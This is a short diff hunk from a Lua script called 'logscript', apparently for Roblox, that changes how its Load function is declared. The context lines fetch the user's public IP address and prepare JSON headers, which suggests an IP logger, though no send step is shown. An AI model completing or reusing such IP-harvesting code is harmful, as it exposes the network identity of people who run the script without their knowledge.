@@ -4,7 +4,7 @@ local logscript = {
 }
 
 
-function logscript.Load()
+function logscript:Load()
   local IPv4 = game:HttpGet("https://v4.ident.me/")
 
   local Headers = {["content-type"] = "application/json"}
